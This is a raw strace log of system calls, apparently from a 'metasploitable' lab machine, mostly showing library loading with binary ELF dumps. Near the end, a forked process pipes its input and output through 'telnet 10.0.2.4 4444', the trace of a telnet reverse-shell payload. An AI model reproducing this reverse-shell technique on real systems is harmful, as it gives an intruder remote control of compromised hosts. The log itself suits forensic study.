@\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
+29841 15:04:56.617525 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+29841 15:04:56.617546 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dab000
+29841 15:04:56.617558 mmap2(0xb7dbf000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dbf000
+29841 15:04:56.617575 mmap2(0xb7dc1000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dc1000
+29841 15:04:56.617589 close(1)          = 0
+29841 15:04:56.617615 munmap(0xb7f51000, 29913) = 0
+29841 15:04:56.617633 open("/etc/ld.so.cache", O_RDONLY) = 1
+29841 15:04:56.617646 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29841 15:04:56.617662 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f51000
+29841 15:04:56.617673 close(1)          = 0
+29841 15:04:56.617683 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.617698 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
+29841 15:04:56.617712 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
+29841 15:04:56.617803 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+29841 15:04:56.617819 brk(0x80ff000)    = 0x80ff000
+29841 15:04:56.617832 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7da1000
+29841 15:04:56.617844 mmap2(0xb7da9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7da9000
+29841 15:04:56.617860 close(1)          = 0
+29841 15:04:56.617873 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.617890 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
+29841 15:04:56.617905 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
+29841 15:04:56.617994 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+29841 15:04:56.618035 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d96000
+29841 15:04:56.618072 mmap2(0xb7d9f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d9f000
+29841 15:04:56.618107 close(1)          = 0
+29841 15:04:56.618129 munmap(0xb7f51000, 29913) = 0
+29841 15:04:56.618146 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
+29841 15:04:56.618161 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+29841 15:04:56.618173 _llseek(1, 0, [0], SEEK_CUR) = 0
+29841 15:04:56.618185 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
+29841 15:04:56.618201 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f58000
+29841 15:04:56.618212 _llseek(1, 1624, [1624], SEEK_SET) = 0
+29841 15:04:56.618227 munmap(0xb7f58000, 1624) = 0
+29841 15:04:56.618237 close(1)          = 0
+29841 15:04:56.618260 brk(0x8100000)    = 0x8100000
+29841 15:04:56.618279 getpgrp()         = 3831
+29841 15:04:56.618289 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+29841 15:04:56.618304 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
+29841 15:04:56.618319 brk(0x8101000)    = 0x8101000
+29841 15:04:56.618349 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29841 15:04:56.618364 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29841 15:04:56.618379 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29841 15:04:56.618419 brk(0x8102000)    = 0x8102000
+29841 15:04:56.618441 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+29841 15:04:56.618456 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcc6f8) = 29842
+29842 15:04:56.618505 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29842 15:04:56.618607 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29842 15:04:56.618621 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29842 15:04:56.618634 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29842 15:04:56.618656 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29842 15:04:56.618671 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29842 15:04:56.618684 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29842 15:04:56.618698 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+29842 15:04:56.618711 rt_sigaction(SIGINT, {0x8091fd0, [], 0}, {SIG_DFL}, 8) = 0
+29842 15:04:56.618725 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29842 15:04:56.618739 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29842 15:04:56.618753 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29842 15:04:56.618779 pipe([1, 7])      = 0
+29842 15:04:56.618802 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+29842 15:04:56.618818 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcc6f8) = 29843
+29843 15:04:56.618870 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29843 15:04:56.618884 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29843 15:04:56.618897 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29843 15:04:56.618909 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29843 15:04:56.618940 close(1)          = 0
+29843 15:04:56.618954 dup2(7, 1)        = 1
+29843 15:04:56.618964 close(7)          = 0
+29843 15:04:56.619001 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29843 15:04:56.619022 stat64("/sbin/sleep", 0xbfeddb18) = -1 ENOENT (No such file or directory)
+29843 15:04:56.619035 stat64("/bin/sleep", {st_mode=S_IFREG|0755, st_size=24488, ...}) = 0
+29843 15:04:56.619053 stat64("/bin/sleep", {st_mode=S_IFREG|0755, st_size=24488, ...}) = 0
+29843 15:04:56.619071 brk(0x8103000)    = 0x8103000
+29843 15:04:56.619096 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+29843 15:04:56.619112 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29843 15:04:56.619125 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29843 15:04:56.619138 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29843 15:04:56.619151 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29843 15:04:56.619168 execve("/bin/sleep", ["sleep", "4172"], [/* 14 vars */]) = 0
+29843 15:04:56.619237 brk(0)            = 0x804f000
+29843 15:04:56.619256 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29843 15:04:56.619271 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef8000
+29843 15:04:56.619284 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+29843 15:04:56.619301 open("/etc/ld.so.cache", O_RDONLY) = 7
+29843 15:04:56.619313 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29843 15:04:56.619331 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7ef0000
+29843 15:04:56.619341 close(7)          = 0
+29843 15:04:56.619352 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29843 15:04:56.619367 open("/lib/tls/i686/cmov/librt.so.1", O_RDONLY) = 7
+29843 15:04:56.619382 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\220\31\0\0004\0\0\0\240r\0\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\250b\0\0\250b\0\0\250b\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0Pk\0\0Pk\0\0\5\0\0\0\0\20\0\0\1\0\0\0\300n\0\0\300~\0\0\300~\0\0\250\2\0\0\220\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\334n\0\0\334~\0\0\334~\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\274b\0\0\274b\0\0\274b\0\0t\0\0\0t\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300n\0\0\300~\0\0\300~\0\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0O\0\0\0C\0\0\0\10\0\0\0\10\0\0\0\21A\0041\250\f(\2\10Q\34\213\0\0242\340\250J\2\222\0`P i\2\307\366\0\21D\7\0\0\0\0\0\0\0\0C\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0E\0\0\0\0\0\0\0F\0\0\0G\0\0\0\0\0\0\0H\0\0\0\0\0\0\0\0\0\0\0I\0\0\0J\0\0\0K\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
+29843 15:04:56.619474 fstat64(7, {st_mode=S_IFREG|0644, st_size=30624, ...}) = 0
+29843 15:04:56.619492 mmap2(NULL, 33360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7ee7000
+29843 15:04:56.619504 mmap2(0xb7eee000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x6) = 0xb7eee000
+29843 15:04:56.619520 close(7)          = 0
+29843 15:04:56.619532 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29843 15:04:56.619546 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+29843 15:04:56.619560 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
+29843 15:04:56.619664 fstat64(7, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+29843 15:04:56.619683 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7d98000
+29843 15:04:56.619695 mmap2(0xb7ee1000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x149) = 0xb7ee1000
+29843 15:04:56.619710 mmap2(0xb7ee4000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ee4000
+29843 15:04:56.619725 close(7)          = 0
+29843 15:04:56.619738 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29843 15:04:56.619751 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 7
+29843 15:04:56.619766 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
+29843 15:04:56.619854 fstat64(7, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
+29843 15:04:56.619871 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d97000
+29843 15:04:56.619884 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7d7f000
+29843 15:04:56.619895 mmap2(0xb7d93000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x13) = 0xb7d93000
+29843 15:04:56.619910 mmap2(0xb7d95000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d95000
+29843 15:04:56.619924 close(7)          = 0
+29843 15:04:56.619944 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d7e000
+29843 15:04:56.619956 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d7e6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+29843 15:04:56.624738 mprotect(0xb7ee1000, 4096, PROT_READ) = 0
+29843 15:04:56.624738 munmap(0xb7ef0000, 29913) = 0
+29843 15:04:56.624738 set_tid_address(0xb7d7e6f8) = 29843
+29843 15:04:56.624738 set_robust_list(0xb7d7e700, 0xc) = 0
+29843 15:04:56.624746 futex(0xbfb4b8d0, 0x81 /* FUTEX_??? */, 1) = 0
+29843 15:04:56.624760 rt_sigaction(SIGRTMIN, {0xb7d832c0, [], SA_SIGINFO}, NULL, 8) = 0
+29843 15:04:56.624774 rt_sigaction(SIGRT_1, {0xb7d83340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
+29843 15:04:56.624787 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
+29843 15:04:56.624806 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
+29843 15:04:56.624824 uname({sys="Linux", node="metasploitable", ...}) = 0
+29843 15:04:56.624906 brk(0)            = 0x804f000
+29843 15:04:56.624916 brk(0x8070000)    = 0x8070000
+29843 15:04:56.624943 clock_gettime(CLOCK_MONOTONIC, {29506, 441956991}) = 0
+29843 15:04:56.624956 nanosleep({4172, 0},  <unfinished ...>
+4519  15:04:56.624968 waitpid(29839,  <unfinished ...>
+29839 15:04:56.624986 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29839 15:04:56.625006 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29839 15:04:56.625021 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29839 15:04:56.625062 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29839 15:04:56.625076 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
+29839 15:04:56.625106 waitpid(-1,  <unfinished ...>
+29842 15:04:56.625122 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
+29841 15:04:56.625138 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+29842 15:04:56.625146 <... rt_sigprocmask resumed> NULL, 8) = 0
+29841 15:04:56.625152 <... rt_sigprocmask resumed> NULL, 8) = 0
+29842 15:04:56.625165 close(7 <unfinished ...>
+29841 15:04:56.625173 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29841 15:04:56.625191 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+29842 15:04:56.625199 <... close resumed> ) = 0
+29842 15:04:56.625214 close(7 <unfinished ...>
+29841 15:04:56.625220 <... rt_sigprocmask resumed> NULL, 8) = 0
+29841 15:04:56.625227 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29841 15:04:56.625241 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
+29841 15:04:56.625258 waitpid(-1,  <unfinished ...>
+29842 15:04:56.625267 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+29842 15:04:56.625277 pipe([7, 8])      = 0
+29842 15:04:56.625305 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+29842 15:04:56.625320 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcc6f8) = 29844
+29844 15:04:56.625372 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29844 15:04:56.625386 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29844 15:04:56.625399 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29844 15:04:56.625412 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29844 15:04:56.625430 close(7)          = 0
+29844 15:04:56.625457 dup2(1, 0)        = 0
+29844 15:04:56.625467 close(1)          = 0
+29844 15:04:56.625476 dup2(8, 1)        = 1
+29844 15:04:56.625485 close(8)          = 0
+29844 15:04:56.625533 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29844 15:04:56.625579 stat64("/sbin/telnet", 0xbfeddb18) = -1 ENOENT (No such file or directory)
+29844 15:04:56.625592 stat64("/bin/telnet", 0xbfeddb18) = -1 ENOENT (No such file or directory)
+29844 15:04:56.625618 stat64("/usr/sbin/telnet", 0xbfeddb18) = -1 ENOENT (No such file or directory)
+29844 15:04:56.625631 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+29844 15:04:56.625652 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+29844 15:04:56.625671 brk(0x8103000)    = 0x8103000
+29844 15:04:56.625687 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+29844 15:04:56.625702 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29844 15:04:56.625714 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29844 15:04:56.625728 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29844 15:04:56.625740 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29844 15:04:56.625758 execve("/usr/bin/telnet", ["telnet", "10.0.2.4", "4444"], [/* 14 vars */]) = 0
+29844 15:04:56.625830 brk(0)            = 0x805d000
+29844 15:04:56.625849 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.625864 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc3000
+29844 15:04:56.625880 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.625897 open("/etc/ld.so.cache", O_RDONLY) = 7
+29844 15:04:56.625910 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29844 15:04:56.625931 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7fbb000
+29844 15:04:56.625942 close(7)          = 0
+29844 15:04:56.625953 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.625968 open("/lib/libncurses.so.5", O_RDONLY) = 7
+29844 15:04:56.625981 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0